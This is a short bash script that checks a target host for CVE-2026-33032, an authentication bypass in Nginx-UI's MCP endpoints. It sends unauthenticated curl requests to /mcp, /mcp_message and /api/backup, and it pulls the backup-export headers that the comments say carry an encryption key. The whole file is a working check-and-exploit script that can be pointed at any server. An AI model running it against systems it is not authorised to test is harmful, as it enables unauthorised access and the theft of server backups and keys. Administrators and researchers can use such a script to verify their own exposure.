#!/bin/bash
TARGET="$1"
[[ -z "$TARGET" ]] && echo "Usage: $0 <target:port>" && exit 1

echo "[*] Testing CVE-2026-33032 - Nginx-UI MCP Auth Bypass"
echo "[*] Target: $TARGET"

# Test /mcp (should require auth)
echo "[*] Testing /mcp (auth required):"
curl -s "http://$TARGET/mcp" -w "\nHTTP %{http_code}\n"

# Test /mcp_message (ZERO-AUTH)
echo "[*] Testing /mcp_message (ZERO-AUTH):"
curl -s "http://$TARGET/mcp_message" -w "\nHTTP %{http_code}\n"

# Test /api/backup (unauth backup export with encryption key in header)
echo "[*] Testing /api/backup:"
curl -s -i "http://$TARGET/api/backup" 2>&1 | grep -E "X-Backup|HTTP|Content"

